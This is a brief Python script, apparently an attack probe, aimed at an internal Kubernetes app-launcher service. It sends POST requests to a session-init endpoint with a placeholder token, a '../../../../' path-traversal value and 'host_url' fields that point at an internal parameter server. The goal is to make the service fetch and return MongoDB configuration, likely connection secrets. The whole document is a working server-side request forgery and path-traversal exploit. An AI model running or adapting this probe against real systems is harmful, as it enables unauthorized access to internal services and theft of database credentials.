import json, urllib.request, urllib.error
base='http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local/session/init'
hosts=[
 ('mdb1','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local/get_param?param_key=MONGODB&pod=slserver&params[replica_set]=slserver'),
 ('mdb2','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local/get_param?param_key=MONGODB&pod=slserver'),
 ('mdb3','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local/get_param?param_key=MONGODB'),
 ('mdb4','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local/get_param?param_key=MONGODB&pod=slserver&params[replica_set]=analytics'),
]
for n,h in hosts:
 b=json.dumps({'user_id':'probe-metaserve-param@armorerlabs.com','host_url':h,'project_path':'../../../../','project_id':'probe','force':True}).encode()
 q=urllib.request.Request(base,b,method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
 try:
  x=urllib.request.urlopen(q,timeout=10); print(n,x.status,x.read(2000).decode('utf-8','replace'))
 except urllib.error.HTTPError as e: print(n,e.code,e.read(2000).decode('utf-8','replace'))
 except Exception as e: print(n,repr(e))
